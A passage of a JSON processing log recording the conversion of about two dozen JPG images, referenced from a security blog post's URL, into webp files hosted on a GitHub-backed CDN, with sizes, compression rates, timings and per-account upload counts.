KB","compressRate":"39.3%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071241.jpg","sourceStatusCode":200,"destWidth":830,"destHeight":418,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn48@2020_5/2021/05/27/16-13-18-408_6a5397ddf7edb8bc.webp","sourceBytes":71560,"destBytes":26044,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":3246,"convertSpendMs":12,"createdTime":"2021-05-28 00:13:15","host":"us-008*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"69.9 KB","destSize":"25.4 KB","compressRate":"36.4%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071206.jpg","sourceStatusCode":200,"destWidth":1274,"destHeight":482,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn99@2020_6/2021/05/27/16-13-18-594_d612bfe0fa47a642.webp","sourceBytes":167438,"destBytes":69270,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":3396,"convertSpendMs":25,"createdTime":"2021-05-28 00:13:15","host":"us-034*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"163.5 KB","destSize":"67.6 KB","compressRate":"41.4%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031659.jpg","sourceStatusCode":200,"destWidth":957,"destHeight":736,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn18@2020_3/2021/05/27/16-13-18-166_9229abaee7a4034a.webp","sourceBytes":159101,"destBytes":60574,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":3306,"convertSpendMs":26,"createdTime":"2021-05-28 00:13:15","host":"europe65*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"155.4 KB","destSize":"59.2 KB","compressRate":"38.1%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071601.jpg","sourceStatusCode":200,"destWidth":1042,"destHeight":876,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn40@2020_6/2021/05/27/16-13-18-255_dffe3b115ae9b973.webp","sourceBytes":150247,"destBytes":61392,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":3354,"convertSpendMs":26,"createdTime":"2021-05-28 00:13:15","host":"europe69*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"146.7 KB","destSize":"60 KB","compressRate":"40.9%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032346.jpg","sourceStatusCode":200,"destWidth":1694,"destHeight":370,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn11@2020_6/2021/05/27/16-13-18-761_fd4b7d7e0c549ad7.webp","sourceBytes":101032,"destBytes":42084,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":3515,"convertSpendMs":18,"createdTime":"2021-05-28 00:13:15","host":"us-014*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"98.7 KB","destSize":"41.1 KB","compressRate":"41.7%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070449.jpg","sourceStatusCode":200,"destWidth":606,"destHeight":686,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn30@2020_6/2021/05/27/16-13-18-761_1921dae9394e3ce8.webp","sourceBytes":88389,"destBytes":37204,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":3574,"convertSpendMs":15,"createdTime":"2021-05-28 00:13:15","host":"us-005*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"86.3 KB","destSize":"36.3 KB","compressRate":"42.1%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070515.jpg","sourceStatusCode":200,"destWidth":830,"destHeight":408,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn88@2020_5/2021/05/27/16-13-18-837_d588ee3942dbd123.webp","sourceBytes":61225,"destBytes":20016,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":3586,"convertSpendMs":12,"createdTime":"2021-05-28 00:13:15","host":"us-53*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"59.8 KB","destSize":"19.5 KB","compressRate":"32.7%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-072024.jpg","sourceStatusCode":200,"destWidth":1630,"destHeight":928,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn74@2020_4/2021/05/27/16-13-19-258_86f606b7d42b432a.webp","sourceBytes":258183,"destBytes":100722,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":4064,"convertSpendMs":39,"createdTime":"2021-05-28 00:13:15","host":"us-014*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"252.1 KB","destSize":"98.4 KB","compressRate":"39%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071642.jpg","sourceStatusCode":200,"destWidth":1256,"destHeight":372,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn44@2020_5/2021/05/27/16-13-19-203_33f73767300cb4d8.webp","sourceBytes":67932,"destBytes":25832,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":3977,"convertSpendMs":13,"createdTime":"2021-05-28 00:13:15","host":"europe-57*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"66.3 KB","destSize":"25.2 KB","compressRate":"38%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-24-100435.jpg","sourceStatusCode":200,"destWidth":939,"destHeight":484,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn59@2020_1/2021/05/27/16-13-19-209_fce89819a263d9d0.webp","sourceBytes":94128,"destBytes":39398,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":4056,"convertSpendMs":15,"createdTime":"2021-05-28 00:13:15","host":"europe-23*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"91.9 KB","destSize":"38.5 KB","compressRate":"41.9%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070434.jpg","sourceStatusCode":200,"destWidth":408,"destHeight":166,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn49@2020_4/2021/05/27/16-13-19-527_0ea95ed3ff2d353e.webp","sourceBytes":20237,"destBytes":9652,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":4297,"convertSpendMs":4,"createdTime":"2021-05-28 00:13:15","host":"us-009*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"19.8 KB","destSize":"9.4 KB","compressRate":"47.7%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-031720.jpg","sourceStatusCode":200,"destWidth":1330,"destHeight":812,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn3@2020_5/2021/05/27/16-13-19-622_02132d505a1d1560.webp","sourceBytes":325564,"destBytes":138584,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":4374,"convertSpendMs":44,"createdTime":"2021-05-28 00:13:15","host":"us-55*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"317.9 KB","destSize":"135.3 KB","compressRate":"42.6%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071054.jpg","sourceStatusCode":200,"destWidth":1088,"destHeight":388,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn67@2020_5/2021/05/27/16-13-19-947_cea19465483f0731.webp","sourceBytes":91702,"destBytes":38702,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":4677,"convertSpendMs":15,"createdTime":"2021-05-28 00:13:15","host":"us-025*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"89.6 KB","destSize":"37.8 KB","compressRate":"42.2%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070621.jpg","sourceStatusCode":200,"destWidth":1808,"destHeight":1102,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn16@2020_5/2021/05/27/16-13-19-587_3a8013ea72e27928.webp","sourceBytes":367662,"destBytes":150730,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":4614,"convertSpendMs":74,"createdTime":"2021-05-28 00:13:15","host":"europe64*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"359 KB","destSize":"147.2 KB","compressRate":"41%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071716.jpg","sourceStatusCode":200,"destWidth":996,"destHeight":632,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn63@2020_4/2021/05/27/16-13-19-603_f1b7a03eb0a3981c.webp","sourceBytes":118347,"destBytes":48328,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":4628,"convertSpendMs":22,"createdTime":"2021-05-28 00:13:15","host":"europe61*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"115.6 KB","destSize":"47.2 KB","compressRate":"40.8%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-24-100040.jpg","sourceStatusCode":200,"destWidth":339,"destHeight":590,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn7@2020_1/2021/05/27/16-13-20-185_2a7430441f63f580.webp","sourceBytes":43674,"destBytes":16140,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":5041,"convertSpendMs":7,"createdTime":"2021-05-28 00:13:15","host":"us-032*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"42.7 KB","destSize":"15.8 KB","compressRate":"37%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-041938.jpg","sourceStatusCode":200,"destWidth":786,"destHeight":134,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn70@2020_6/2021/05/27/16-13-20-406_14988903bdd61441.webp","sourceBytes":40305,"destBytes":17678,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":5136,"convertSpendMs":6,"createdTime":"2021-05-28 00:13:15","host":"us-013*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"39.4 KB","destSize":"17.3 KB","compressRate":"43.9%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032701.jpg","sourceStatusCode":200,"destWidth":1308,"destHeight":552,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn94@2020_6/2021/05/27/16-13-20-215_829933f37f0ee8d7.webp","sourceBytes":134129,"destBytes":51344,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":5023,"convertSpendMs":20,"createdTime":"2021-05-28 00:13:15","host":"europe-60*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"131 KB","destSize":"50.1 KB","compressRate":"38.3%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070909.jpg","sourceStatusCode":200,"destWidth":830,"destHeight":352,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn28@2020_5/2021/05/27/16-13-20-924_e92c621ef2ef6593.webp","sourceBytes":119560,"destBytes":55134,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":5701,"convertSpendMs":15,"createdTime":"2021-05-28 00:13:15","host":"us-017*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"116.8 KB","destSize":"53.8 KB","compressRate":"46.1%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070946.jpg","sourceStatusCode":200,"destWidth":1506,"destHeight":1068,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn8@2020_4/2021/05/27/16-13-21-023_d8fb50260deaeda1.webp","sourceBytes":227093,"destBytes":84056,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":5770,"convertSpendMs":51,"createdTime":"2021-05-28 00:13:15","host":"us-026*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"221.8 KB","destSize":"82.1 KB","compressRate":"37%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031809.jpg","sourceStatusCode":200,"destWidth":1035,"destHeight":376,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn85@2020_1/2021/05/27/16-13-21-021_397e175fe1beae47.webp","sourceBytes":69167,"destBytes":26464,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":5824,"convertSpendMs":12,"createdTime":"2021-05-28 00:13:15","host":"us-022*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"67.5 KB","destSize":"25.8 KB","compressRate":"38.3%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032016.jpg","sourceStatusCode":200,"destWidth":1108,"destHeight":598,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn91@2020_4/2021/05/27/16-13-21-587_47eaf3e1f230c087.webp","sourceBytes":137329,"destBytes":56574,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":6617,"convertSpendMs":21,"createdTime":"2021-05-28 00:13:15","host":"europe-22*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"134.1 KB","destSize":"55.2 KB","compressRate":"41.2%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-042028.jpg","sourceStatusCode":200,"destWidth":1588,"destHeight":852,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn97@2020_2/2021/05/27/16-13-22-594_8a53a7a617fa01a9.webp","sourceBytes":206996,"destBytes":76542,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":7415,"convertSpendMs":43,"createdTime":"2021-05-28 00:13:15","host":"europe61*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"202.1 KB","destSize":"74.7 KB","compressRate":"37%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031841.jpg","sourceStatusCode":200,"destWidth":1753,"destHeight":728,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn52@2020_6/2021/05/27/16-13-24-187_1a70c1b396fb00b1.webp","sourceBytes":286775,"destBytes":118476,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":5085,"convertSpendMs":42,"createdTime":"2021-05-28 00:13:19","host":"us-039*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"280.1 KB","destSize":"115.7 KB","compressRate":"41.3%"}],"successGithubMap":{"myreaderx8":1,"myreaderx7":1,"myreaderx15":1,"myreaderx16":1,"myreaderx6":1,"myreaderx10":1,"myreaderx32":2,"myreaderx4":1,"myreaderx3":1,"myreaderx11":1,"myreaderx33":1,"myreaderx12":1,"myreaderx2":2,"myreaderx1":1,"myreaderx13":1,"myreaderx30":1,"myreaderx18":1,"myreaderx19":1,"myreaderx":1,"myreaderx25":1,"myreaderx27":1,"myreaderx21":1,"myreaderx22":2,"myreaderx24":1,"myreaderx5oss":1,"myreaderx29":1},"failGithubMap":{"myreaderx14":2,"myreaderx23":2,"myreaderx31":1}}